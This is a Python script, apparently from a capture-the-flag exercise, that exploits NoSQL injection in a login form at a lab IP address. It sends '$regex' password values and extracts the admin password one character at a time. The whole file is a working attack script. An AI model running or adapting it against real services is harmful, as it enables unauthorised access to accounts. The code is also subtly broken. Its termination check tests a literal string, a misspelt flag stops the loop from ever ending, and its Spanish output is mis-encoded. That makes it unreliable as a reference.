import requests
import json
import string
import sys

def login(password):
    payload = '{"$regex":"%s"}' %password
    data= {"user":"admin","password":json.loads(payload)}
    r=requests.post("http://10.10.11.139:5000/login",json=data)
    if "Invalid Password" in r.text:
        return False
    return True

completed_pw=False
password="^"
while completed_pw==False:
    for letter in string.ascii_letters:
        if login(f"{password}{letter}"):
            password+=letter
            print(password)
            break;
    if login(f"password$"):
        completes_pw = True
        print(f"la contrase√±a es: {password}")



